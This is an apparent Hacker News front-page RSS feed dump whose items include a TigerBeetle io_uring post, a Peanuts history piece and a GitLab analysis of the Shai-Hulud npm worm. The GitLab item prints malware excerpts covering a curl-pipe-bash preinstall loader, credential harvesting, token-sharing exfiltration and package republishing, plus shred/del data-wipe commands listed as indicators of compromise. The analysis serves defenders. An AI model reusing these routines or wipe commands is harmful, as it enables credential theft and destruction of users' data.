{"id":"4W3i2hyrJTVfcLq85rWgduVQ3y3BMzrSD4pVUCMqPpFhmXWpqxQ","title":"Hacker News: Front Page","displayTitle":"HN Front","url":"https://hnrss.org/frontpage?points=75","feedLink":"https://news.ycombinator.com/","isQuery":false,"isEmpty":false,"isHidden":false,"itemCount":11,"items":[{"title":"Show HN: Glasses to detect smart-glasses that have cameras","url":"https://github.com/NullPxl/banrays","date":1764309158,"author":"nullpxl","guid":133,"unread":true,"content":"<p>Hi! Recently smart-glasses with cameras like the Meta Ray-bans seem to be getting more popular. As does some people's desire to remove/cover up the recording indicator LED. I wanted to see if there's a way to detect when people are recording with these types of glasses, so a little bit ago I started working this project. I've hit a little bit of a wall though so I'm very much open to ideas!</p><p>I've written a bunch more on the link (+photos are there), but essentially this uses 2 fingerprinting approaches: \n- retro-reflectivity of the camera sensor by looking at IR reflections. mixed results here.\n- wireless traffic (primarily BLE, also looking into BTC and wifi)</p><p>For the latter, I'm currently just using an ESP32, and I can consistently detect when the Meta Raybans are 1) pairing, 2) first powered on, 3) (less consistently) when they're taken out of the charging case. When they do detect something, it plays a little jingle next to your ear.</p><p>Ideally I want to be able to detect them when they're in use, and not just at boot. I've come across the nRF52840, which seems like it can follow directed BLE traffic beyond the initial broadcast, but from my understanding it would still need to catch the first CONNECT_REQ event regardless. On the bluetooth classic side of things, all the hardware looks really expensive! Any ideas are appreciated. Thanks!</p>","contentLength":1355,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46075882"},{"title":"How Charles M Schulz created Charlie Brown and Snoopy (2024)","url":"https://www.bbc.com/culture/article/20241205-how-charles-m-schulz-created-charlie-brown-and-snoopy","date":1764288638,"author":"1659447091","guid":148,"unread":true,"content":"<p><b>Charles M Schulz drew his beloved Peanuts strip for 50 years until his announcement on 14 December 1999 that ill health was forcing him to retire. In History looks at how an unassuming cartoonist built a billion-dollar empire out of the lives of a group of children, a dog and a bird.</b></p><p>Charles M Schulz's timeless creation Charlie Brown may have been as popular as any character in all of literature, but the cartoonist was modest about the scope of his miniature parables. In a 1977 BBC interview, he said: \"I'm talking only about the minor everyday problems in life. Leo Tolstoy dealt with the major problems of the world. I'm only dealing with why we all have the feeling that people don't like us.\"&nbsp;&nbsp;</p><p>This did not mean that he felt as if he was dealing with trivial matters. He said: \"I'm always very much offended when someone asks me, 'Do I ever do satire on the social condition?' Well, I do it almost every day. And they say, 'Well, do you ever do political things?' I say, 'I do things which are more important than politics. I'm dealing with love and hate and mistrust and fear and insecurity.'\"&nbsp;&nbsp;</p><div><figcaption>WATCH: 'Cartooning is drawing funny pictures whether they're silly or rather meaningful political cartoons'.</figcaption></div><p>While Charlie Brown may have been the eternal failure, the universal feelings that Schulz channelled helped make <a target=\"_self\" href=\"https://www.bbc.com/culture/article/20181112-good-grief-the-beguiling-philosophy-of-peanuts\">Peanuts</a> a global success. Born in 1922, Schulz drew every single Peanuts strip himself from 1950 until his death in February 2000. It was so popular that Nasa named two of the modules in its May 1969 <a target=\"_self\" href=\"https://www.bbc.co.uk/programmes/articles/4M9zXf4hWZhHMdhZrDhn472/seven-things-you-might-not-know-about-peanuts\">Apollo 10 lunar mission</a> after Charlie Brown and Snoopy. The strip was syndicated in more than 2,600 newspapers worldwide, and inspired films, music and countless items of merchandise.&nbsp;</p><p>Part of its success, according to the writer Umberto Eco, was that it worked on different levels. <a target=\"_blank\" href=\"http://:%20https:/www.nybooks.com/articles/1985/06/13/on-krazy-kat-and-peanuts/\">He wrote</a>: \"Peanuts charms both sophisticated adults and children with equal intensity, as if each reader found there something for himself, and it is always the same thing, to be enjoyed in two different keys. Peanuts is thus a little human comedy for the innocent reader and for the sophisticated.\"&nbsp;</p><p>Schulz's initial reason for focusing on children in the strip was strictly commercial. In 1990, he <a target=\"_blank\" href=\"https://www.facebook.com/BBCArchive/videos/139456464818589/\">told the BBC</a>: \"I always hate to say it, but I drew little kids because this is what sold. I wanted to draw something, I didn't know what it was, but it just seemed as if whenever I drew children, these were the cartoons that editors seemed to like the best. And so, back in 1950, I mailed a batch of cartoons to New York City, to United Features Syndicate, and they said they liked them, and so ever since I've been drawing little kids.\"&nbsp;&nbsp;</p>","contentLength":2657,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46074362"},{"title":"Vsora Jotunn-8 5nm European inference chip","url":"https://vsora.com/products/jotunn-8/","date":1764286211,"author":"rdg42","guid":147,"unread":true,"content":"<div>To provide the best experiences, we use technologies like cookies to store and/or access device information. Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions.</div>","contentLength":317,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46074111"},{"title":"A programmer-friendly I/O abstraction over io_uring and kqueue (2022)","url":"https://tigerbeetle.com/blog/2022-11-23-a-friendly-abstraction-over-iouring-and-kqueue/","date":1764283266,"author":"enz","guid":145,"unread":true,"content":"<p>Consider this tale of I/O and performance. We’ll start with blocking\nI/O, explore io_uring and kqueue, and take home an event loop very\nsimilar to some software you may find familiar.</p><p>When you want to read from a file you might  and\nthen call  as many times as necessary to fill a\nbuffer of bytes from the file. And in the opposite direction, you call\n as many times as needed until everything is\nwritten. It’s similar for a TCP client with sockets, but instead of\n you first call  and then\n to your server. Fun stuff.</p><p>In the real world though you can’t always read everything you want\nimmediately from a file descriptor. Nor can you always write everything\nyou want immediately to a file descriptor.</p><p>You can <a href=\"https://stackoverflow.com/questions/12773509/read-is-not-blocking-in-socket-programming/12775464#12775464\">switch\na file descriptor into non-blocking mode</a> so the call won’t block\nwhile data you requested is not available. But system calls are still\nexpensive, incurring context switches and cache misses. In fact,\nnetworks and disks have become so fast that these costs can start to\napproach the cost of doing the I/O itself. For the duration of time a\nfile descriptor is unable to read or write, you don’t want to waste time\ncontinuously retrying read or write system calls.</p><p>So you switch to io_uring on Linux or kqueue on FreeBSD/macOS. (I’m\nskipping the generation of epoll/select users.) These APIs let you\nsubmit requests to the kernel to learn about readiness: when a file\ndescriptor is ready to read or write. You can send readiness requests in\nbatches (also referred to as queues). Completion events, one for each\nsubmitted request, are available in a separate queue.</p><p>Being able to batch I/O like this is especially important for TCP\nservers that want to multiplex reads and writes for multiple connected\nclients.</p><p>However in io_uring, you can even go one step further. Instead of\nhaving to call  or  in userland\nafter a readiness event, you can request that the kernel do the\n or  itself with a buffer you\nprovide. Thus almost all of your I/O is done in the kernel, amortizing\nthe overhead of system calls.</p><p>If you haven’t seen io_uring or kqueue before, you’d probably like an\nexample! Consider this code: a simple, minimal, not-production-ready TCP\necho server.</p><div><pre><code></code></pre></div><p>This is a great, minimal example. But notice that this code ties\nio_uring behavior directly to business logic (in this case, handling\nechoing data between request and response). It is fine for a small\nexample like this. But in a large application you might want to do I/O\nthroughout the code base, not just in one place. You might not want to\nkeep adding business logic to this single loop.</p><p>Instead, you might want to be able to schedule I/O and pass a\ncallback (and sometimes with some application context) to be called when\nthe event is complete.</p><p>The interface might look like:</p><div><pre><code></code></pre></div><p>This is great! Now your business logic can schedule and handle I/O no\nmatter where in the code base it is.</p><p>Under the hood it can decide whether to use io_uring or kqueue\ndepending on what kernel it’s running on. The dispatch can also batch\nthese individual calls through io_uring or kqueue to amortize system\ncalls. The application no longer needs to know the details.</p><p>Additionally, we can use this wrapper to stop thinking about\nreadiness events, just I/O completion. That is, if we dispatch a read\nevent, the io_uring implementation would actually ask the kernel to read\ndata into a buffer. Whereas the kqueue implementation would send a\n“read” readiness event, do the read back in userland, and then call our\ncallback.</p><p>And finally, now that we’ve got this central dispatcher, we don’t\nneed spaghetti code in a loop switching on every possible submission and\ncompletion event.</p><p>Every time we call io_uring or kqueue we both submit event requests\nand poll for completion events. The io_uring and kqueue APIs tie these\ntwo actions together in the same system call.</p><p>To sync our requests to io_uring or kqueue we’ll build a\n function that submits requests and polls for\ncompletion events. (In the next section we’ll talk about how the user of\nthe central dispatch learns about completion events.)</p><p>To make  more convenient, we’ll build a nice\nwrapper around it so that we can submit as many requests (and process as\nmany completion events) as possible. To avoid accidentally blocking\nindefinitely we’ll also introduce a time limit. We’ll call the wrapper\n.</p><p>Finally we’ll put the user in charge of setting up a loop to call\nthis  function, independent of normal program\nexecution.</p><p>This is now your traditional event loop.</p><p>You may have noticed that in the API above we passed a callback. The\nidea is that after the requested I/O has completed, our callback should\nbe invoked. But the question remains: how to track this callback between\nthe submission and completion queue?</p><p>Thankfully, io_uring and kqueue events have user data fields. The\nuser data field is opaque to the kernel. When a submitted event\ncompletes, the kernel sends a completion event back to userland\ncontaining the user data value from the submission event.</p><p>We can store the callback in the user data field by setting it to the\ncallback’s pointer casted to an integer. When the completion for a\nrequested event comes up, we cast from the integer in the user data\nfield back to the callback pointer. Then, we invoke the callback.</p><p>As described above, the struct for \ncould get quite large handling all the different kinds of I/O events and\ntheir arguments. We could make our API a little more expressive by\ncreating wrapper functions for each event type.</p><p>So if we wanted to schedule a read function we could call:</p><div><pre><code></code></pre></div><div><pre><code></code></pre></div><p>One more thing we need to worry about is that the batch we pass to\nio_uring or kqueue has a fixed size (technically, kqueue allows any\nbatch size but using that might introduce unnecessary allocations). So\nwe’ll build our own queue on top of our I/O abstraction to keep track of\nrequests that we could not immediately submit to io_uring or kqueue.</p><blockquote><p>To keep this API simple we could allocate for each entry in the\nqueue. Or we could modify the  calls slightly\nto accept a struct that can be used in an <a href=\"https://www.data-structures-in-practice.com/intrusive-linked-lists/\">intrusive\nlinked list</a> to contain all request context, including the callback.\nThe latter is <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/d15acc663f8882cb02413129e8351bf3238335e6/src/io/linux.zig#L665\">what\nwe do in TigerBeetle</a>.</p></blockquote><p>Put another way: every time code calls ,\nwe’ll try to immediately submit the requested event to io_uring or\nkqueue. But if there’s no room, we store the event in an overflow\nqueue.</p><p>The overflow queue needs to be processed eventually, so we update our\n function (described in <a href=\"https://tigerbeetle.com/blog/2022-11-23-a-friendly-abstraction-over-iouring-and-kqueue/#callbacks-and-context\">Callbacks and context</a> above) to pull\nas many events from our overflow queue before submitting a batch to\nio_uring or kqueue.</p><p>We’ve now built something similar to <a href=\"https://github.com/libuv/libuv\">libuv</a>, the I/O library that\nNode.js uses. And if you squint, it is basically TigerBeetle’s I/O\nlibrary! (And interestingly enough, TigerBeetle’s I/O code was <a href=\"https://github.com/oven-sh/bun/blob/e14a3af491ece8d1b0309e76ae3022b4fad91f16/src/io/io_linux.zig#L704\">adopted</a>\ninto Bun! Open-source for the win!)</p><p>Let’s check out how the <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/darwin.zig#L436\">Darwin\nversion</a> of TigerBeetle’s I/O library (with kqueue) differs from the\n<a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/linux.zig#L656\">Linux\nversion</a>. As mentioned, the complete  call in the\nDarwin implementation waits for file descriptor readiness (through\nkqueue). Once ready, the actual  call is made back in\nuserland:</p><div><pre><code></code></pre></div><p>Compare this to the <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/linux.zig#L656\">Linux\nversion</a> (with io_uring) where the kernel handles everything and\nthere is no send system call in userland:</p><div><pre><code></code></pre></div><p>Similarly, take a look at  on <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/linux.zig#L66\">Linux</a>\nand <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/darwin.zig#L75\">macOS</a>\nfor event processing. Look at  on <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/linux.zig#L66]\">Linux</a>\nand <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/darwin.zig#L75\">macOS</a>\nfor the public API users must call. And finally, look at what puts this\nall into practice, the loop calling  in\nsrc/main.zig.</p><p>We’ve come this far and you might be wondering — what about\ncross-platform support for Windows? The good news is that Windows also\nhas a completion based system similar to io_uring but without batching,\ncalled <a href=\"https://learn.microsoft.com/en-us/windows/win32/fileio/i-o-completion-ports\">IOCP</a>.\nAnd for bonus points, TigerBeetle provides the <a href=\"https://github.com/tigerbeetle/tigerbeetle/blob/9d3552ba137a773d4b81106739e56cba6cd32a03/src/io/windows.zig\">same\nI/O abstraction over it</a>! But it’s enough to cover just Linux and\nmacOS in this post. :)</p><p>In both this blog post and in TigerBeetle, we implemented a\nsingle-threaded event loop. Keeping I/O code single-threaded in\nuserspace is beneficial (whether or not I/O processing is\nsingle-threaded in the kernel is not our concern). It’s the simplest\ncode and best for workloads that are not embarrassingly parallel. It is\nalso best for determinism, which is integral to the design of\nTigerBeetle because it enables us to do Deterministic Simulation\nTesting</p><p>But there are other valid architectures for other workloads.</p><p>For workloads that are embarrassingly parallel, like many web\nservers, you could instead use multiple threads where each thread has\nits own queue. In optimal conditions, this architecture has the highest\nI/O throughput possible.</p><p>But if each thread has its own queue, individual threads can become\nstarved if an uneven amount of work is scheduled on one thread. In the\ncase of dynamic amounts of work, the better architecture would be to\nhave a single queue but multiple worker threads doing the work made\navailable on the queue.</p><p>Hey, maybe we’ll split this out so you can use it too. It’s written\nin Zig so we can easily expose a C API. Any language with a C foreign\nfunction interface (i.e. every language) should work well with it. Keep\nan eye on <a href=\"https://github.com/tigerbeetle\">our GitHub</a>.\n:)</p>","contentLength":9092,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46073817"},{"title":"DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning [pdf]","url":"https://github.com/deepseek-ai/DeepSeek-Math-V2/blob/main/DeepSeekMath_V2.pdf","date":1764273805,"author":"fspeech","guid":144,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46072786"},{"title":"GitLab discovers widespread NPM supply chain attack","url":"https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/","date":1764257816,"author":"OuterVale","guid":142,"unread":true,"content":"<p>GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the \"<a href=\"https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem\">Shai-Hulud</a>\" malware.</p><p>Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a \"\" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.</p><p><strong>We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.</strong></p><p>Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:</p><ul><li>Harvests credentials from GitHub, npm, AWS, GCP, and Azure</li><li>Exfiltrates stolen data to attacker-controlled GitHub repositories</li><li>Propagates by automatically infecting other packages owned by victims</li><li><strong>Contains a destructive payload that triggers if the malware loses access to its infrastructure</strong></li></ul><p>While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.</p><h2 tabindex=\"-1\">Technical analysis: How the attack unfolds </h2><p>The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified  with a preinstall script pointing to . This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.</p><pre><code>// This file gets added to victim's packages as setup_bun.js\n#!/usr/bin/env node\nasync function downloadAndSetupBun() {\n  // Downloads and installs bun\n  let command = process.platform === 'win32' \n    ? 'powershell -c \"irm bun.sh/install.ps1|iex\"'\n    : 'curl -fsSL https://bun.sh/install | bash';\n  \n  execSync(command, { stdio: 'ignore' });\n  \n  // Runs the actual malware\n  runExecutable(bunPath, ['bun_environment.js']);\n}\n</code></pre><p>The  loader downloads or locates the Bun runtime on the system, then executes the bundled  payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.</p><p>Once executed, the malware immediately begins credential discovery across multiple sources:</p><ul><li>: Searches environment variables and GitHub CLI configurations for tokens starting with  (GitHub personal access token) or (GitHub OAuth token)</li><li>: Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services</li><li>: Extracts tokens for package publishing from  files and environment variables, which are common locations for securely storing sensitive configuration and credentials.</li><li>: Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git history</li></ul><pre><code>async function scanFilesystem() {\n  let scanner = new Trufflehog();\n  await scanner.initialize();\n  \n  // Scan user's home directory for secrets\n  let findings = await scanner.scanFilesystem(os.homedir());\n  \n  // Upload findings to exfiltration repo\n  await github.saveContents(\"truffleSecrets.json\", \n    JSON.stringify(findings));\n}\n</code></pre><h3 tabindex=\"-1\">Data exfiltration network </h3><p>The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: \"Sha1-Hulud: The Second Coming.\" These repositories serve as dropboxes for stolen credentials and system information.</p><pre><code>async function createRepo(name) {\n  // Creates a repository with a specific description marker\n  let repo = await this.octokit.repos.createForAuthenticatedUser({\n    name: name,\n    description: \"Sha1-Hulud: The Second Coming.\", // Marker for finding repos later\n    private: false,\n    auto_init: false,\n    has_discussions: true\n  });\n  \n  // Install GitHub Actions runner for persistence\n  if (await this.checkWorkflowScope()) {\n    let token = await this.octokit.request(\n      \"POST /repos/{owner}/{repo}/actions/runners/registration-token\"\n    );\n    await installRunner(token); // Installs self-hosted runner\n  }\n  \n  return repo;\n}\n</code></pre><p>Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.</p><pre><code>// How the malware network shares tokens:\nasync fetchToken() {\n  // Search GitHub for repos with the identifying marker\n  let results = await this.octokit.search.repos({\n    q: '\"Sha1-Hulud: The Second Coming.\"',\n    sort: \"updated\"\n  });\n  \n  // Try to retrieve tokens from compromised repos\n  for (let repo of results) {\n    let contents = await fetch(\n      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`\n    );\n    \n    let data = JSON.parse(Buffer.from(contents, 'base64').toString());\n    let token = data?.modules?.github?.token;\n    \n    if (token &amp;&amp; await validateToken(token)) {\n      return token;  // Use token from another infected system\n    }\n  }\n  return null;  // No valid tokens found in network\n}\n</code></pre><p>Using stolen npm tokens, the malware:</p><ol><li>Downloads all packages maintained by the victim</li><li>Injects the  loader into each package's preinstall scripts</li><li>Bundles the malicious  payload</li><li>Increments the package version number</li><li>Republishes the infected packages to npm</li></ol><pre><code>async function updatePackage(packageInfo) {\n  // Download original package\n  let tarball = await fetch(packageInfo.tarballUrl);\n  \n  // Extract and modify package.json\n  let packageJson = JSON.parse(await readFile(\"package.json\"));\n  \n  // Add malicious preinstall script\n  packageJson.scripts.preinstall = \"node setup_bun.js\";\n  \n  // Increment version\n  let version = packageJson.version.split(\".\").map(Number);\n  version[2] = (version[2] || 0) + 1;\n  packageJson.version = version.join(\".\");\n  \n  // Bundle backdoor installer\n  await writeFile(\"setup_bun.js\", BACKDOOR_CODE);\n  \n  // Repackage and publish\n  await Bun.$`npm publish ${modifiedPackage}`.env({\n    NPM_CONFIG_TOKEN: this.token\n  });\n}\n</code></pre><p>Our analysis uncovered a destructive payload designed to protect the malware’s infrastructure against takedown attempts.</p><p>The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses  to overwrite files before deletion, making recovery nearly impossible.</p><pre><code>// CRITICAL: Token validation failure triggers destruction\nasync function aL0() {\n  let githubApi = new dq();\n  let npmToken = process.env.NPM_TOKEN || await findNpmToken();\n  \n  // Try to find or create GitHub access\n  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {\n    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos\n    \n    if (!fetchedToken) {  // No GitHub access possible\n      if (npmToken) {\n        // Fallback to NPM propagation only\n        await El(npmToken);\n      } else {\n        // DESTRUCTION TRIGGER: No GitHub AND no NPM access\n        console.log(\"Error 12\");\n        if (platform === \"windows\") {\n          // Attempts to delete all user files and overwrite disk sectors\n          Bun.spawnSync([\"cmd.exe\", \"/c\", \n            \"del /F /Q /S \\\"%USERPROFILE%*\\\" &amp;&amp; \" +\n            \"for /d %%i in (\\\"%USERPROFILE%*\\\") do rd /S /Q \\\"%%i\\\" &amp; \" +\n            \"cipher /W:%USERPROFILE%\"  // Overwrite deleted data\n          ]);\n        } else {\n          // Attempts to shred all writable files in home directory\n          Bun.spawnSync([\"bash\", \"-c\", \n            \"find \\\"$HOME\\\" -type f -writable -user \\\"$(id -un)\\\" -print0 | \" +\n            \"xargs -0 -r shred -uvz -n 1 &amp;&amp; \" +  // Overwrite and delete\n            \"find \\\"$HOME\\\" -depth -type d -empty -delete\"  // Remove empty dirs\n          ]);\n        }\n        process.exit(0);\n      }\n    }\n  }\n}\n</code></pre><p>This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user’s data when a takedown is detected.</p><p>To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.</p><table><tbody><tr><td>Malicious post-install script in node_modules directories</td></tr><tr><td>Hidden directory created in user home for Trufflehog binary storage</td></tr><tr><td>Temporary directory used for binary extraction</td></tr><tr><td><code>.truffler-cache/trufflehog</code></td><td>Downloaded Trufflehog binary (Linux/Mac)</td></tr><tr><td><code>.truffler-cache/trufflehog.exe</code></td><td>Downloaded Trufflehog binary (Windows)</td></tr><tr><td><code>del /F /Q /S \"%USERPROFILE%*\"</code></td><td>Windows destructive payload command</td></tr><tr><td>Linux/Mac destructive payload command</td></tr><tr><td>Windows secure deletion command in payload</td></tr><tr><td><code>curl -fsSL https://bun.sh/install | bash</code></td><td>Suspicious Bun installation during NPM package install</td></tr><tr><td><code>powershell -c \"irm bun.sh/install.ps1|iex\"</code></td><td>Windows Bun installation via PowerShell</td></tr></tbody></table><h2 tabindex=\"-1\">How GitLab can help you detect this malware campaign </h2><p>If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects.</p><p>First, enable <a href=\"https://docs.gitlab.com/user/application_security/dependency_scanning/dependency_scanning_sbom/\"></a> to automatically analyze your project's dependencies against known vulnerability databases. <strong>If infected packages are present in your  or  files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report.</strong> For complete setup instructions, refer to the <a href=\"https://docs.gitlab.com/user/application_security/dependency_scanning/dependency_scanning_sbom/#enabling-the-analyzer\">Dependency Scanning documentation</a>.</p><p>Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch.</p><p>Next, <a href=\"https://docs.gitlab.com/user/gitlab_duo_chat/agentic_chat/\"></a> can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the <a href=\"https://docs.gitlab.com/user/duo_agent_platform/agents/foundational_agents/security_analyst_agent/\">Security Analyst Agent</a> and simply ask questions like:</p><ul><li>\"Are any of my dependencies affected by the Shai-Hulud v2 malware campaign?\"</li><li>\"Does this project have any npm supply chain vulnerabilities?\"</li><li>\"Does this project have any npm supply chain vulnerabilities?\"</li><li>\"Show me critical vulnerabilities in my JavaScript dependencies.\"</li></ul><p>The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects.</p><p>For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one.</p><p>This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.</p><p>GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.</p>","contentLength":11850,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=46070203"},{"title":"Feedback doesn't scale","url":"https://another.rodeo/feedback/","date":1764171614,"author":"ohjeez","guid":138,"unread":true,"content":"<h2>Listening is always hard, and it only gets harder at scale.</h2><p>When you're leading a team of five or 10 people, feedback is pretty easy. It's not even really \"feedback”: you’re just . You may have hired everyone yourself. You might sit near them (or at least sit near them virtually). Maybe you have lunch with them regularly. You know their kids' names, their coffee preferences, and what they're reading. So when someone has a concern about the direction you're taking things, they just... tell you.</p><p>You trust them. They trust you. It's just friends talking. You know where they're coming from.</p><p>At twenty people, things begin to shift a little. You’re probably starting to build up a second layer of leadership and there are multiple teams under you, but you're still fairly close to everyone. The relationships are there, they just may be a bit weaker than before. When someone has a pointed question about your strategy, you probably  know their story, their perspective, and what motivates them. The context is fuzzy, but it’s still there.</p><p>Somewhere around 100 people, the ground shifts underneath you, as you realize you don’t know everyone anymore. You just can't. There aren't enough hours in the day, and honestly, there aren't enough slots in your brain.</p><p>Suddenly you have people whose names you don’t recognize offering very sharp commentary about your “leadership.” They’re talking about you but they don’t  you. There’s no shared history, no accumulated trust, no sense of “we’ve been in the trenches together.” Your brain has no context for processing all these voices.</p><p><em>Who are these people? Why are they yelling at me? Are they generally reasonable, or do they complain about everything? Do they understand the constraints we're under? Do they have the full picture?</em></p><p>Without an existing relationship, it feels like an attack, and your natural human response is to dismiss or deflect the attack. Or worse, to get defensive. Attacks trigger our most primal instincts: fight or flight.</p><p>This is the point where a lot of leaders start to struggle. They still want to be open to feedback—they really do—but they're also drowning. They start trusting their intuition about what they should pay attention to and what they should ignore. Sometimes that intuition is right. Sometimes it's just... self-selected, stripped of context, pattern matching against existing biases and relationships.</p><p>On top of that, each extra layer of management, each extra level to the top has separated you, and now you’re just not like them anymore. Their struggles are not your struggles anymore.</p><p>By the time you reach 200 people or more, feedback isn't an actionable signal anymore. At that size, feedback stops being signal being noise. A big, echoing amphitheater of opinions, each louder than the last, each written in the tone of someone who is absolutely  they understand the whole system (they don’t), the whole context (they don’t), and your motives (they definitely don’t).</p><p>And all those kudos you used to hear? Those dry up. When you had a close relationship with everyone, kudos came naturally. You were just talking. But now folks just expect you to lead, and if they’re happy with your leadership they’re probably mostly quiet about it. They're doing their jobs, trusting you, assuming things are generally fine.</p><p>The people who are unhappy? They're loud. And there are a lot of them.</p><p>From where you sit, it feels like everybody's mad about everything all the time. And maybe they are! Or maybe it's just selection bias combined with the natural amplification that happens when people with similar grievances find each other.  You don't know if this is a real crisis or just three loud people who found each other in a Slack channel. You just can’t tell anymore.</p><p>Because feedback doesn’t scale. Humans scale poorly. Your nervous system definitely doesn’t scale.</p><p>Feedback doesn't scale because relationships don’t scale. With five people, you have some personal interaction with everyone on the team. At twenty, you interact with some, but not all. At 100 you still have personal relationships with 10 or 15 people, so there are a lot of gaps. At 200, your personal relationships are a tiny slice of the overall pie.</p><p>Making matters worse, as the din gets louder and louder, channels for processing all that feedback get smaller and smaller. Where you once had an open-door policy, now you have “office hours.” Sometimes. When we’re not too busy.</p><p>Where once All-Hands meetings had open questions, now you’re forced to take the questions ahead of time. Or not at all.</p><p>Even your Slack usage dwindles, because half the time you say anything, someone’s upset with it.</p><p>We tell ourselves we're \"staying close to the ground\" and \"maintaining our culture,” But we're not. We can't. Because the fundamental math doesn't work. The sheer volume of feedback we’re getting absolutely overwhelms our ability to process it.</p><h2 tabindex=\"-1\">So what do you do about it?<a href=\"https://another.rodeo/feedback/#so-what-do-you-do-about-it\" aria-hidden=\"true\">#</a></h2><p>First, you have to admit the problem exists. Stop pretending you can maintain personal relationships with 200 people. You can't. Nobody can. Once you accept this, you can start building systems and processes that work with this reality instead of bumping against it. You have to filter, sort, and collate the feedback coming in, and you need to do it at a scale larger than your own capacity.</p><p>When you can’t rely on “just talk to people,” you need systems that distinguish between:</p><ul><li>and “this person is projecting a whole other problem onto leadership”</li></ul><p>That means: structured listening, actual intake processes, and ways to synthesize themes instead of reacting to every single spike.</p><p><strong>Build proxy relationships.</strong> You can't know 200 people, but you can know 10 people who each know 10 people. You should already have strong, trusting relationships with your leadership team, and then set the expectation that they have strong relationships with their own teams, and explicitly ask what’s on people’s minds. When feedback comes up through this chain, it comes with context. Pay attention.</p><p>At small scale, trust is direct:  At larger scale, trust must be delegated: <em>I trust the leaders who are closer to the work than I am.</em> If you don’t intentionally empower those leaders to absorb and contextualize feedback, you’ll drown. They’re the ones who can say: \"I know who said that, why they said it, and here’s what’s actually going on.\"</p><p><strong>Build structured channels for feedback</strong>. For example, you can set up working groups to dive into thorny problems. The people closest to the problem understand it better than you do, and they can turn a flood of complaints into something you can actually act on. Or consider starting an \"employee steering committee\" for the sole purpose of collecting feedback and turning it into proposals. You’re essentially deputizing people who care deeply to listen for you, and then manage the feedback din.</p><p><strong>Remember that every angry message is still a person.</strong> When someone you know well gives you feedback, you might not like it, but you’re likely to say \"Oof. Okay. Let’s talk.\" At scale, you need to find ways to respond with humanity — even when the feedback you received lacks it.</p><p> Let people know when you’re acting on their feedback, and if 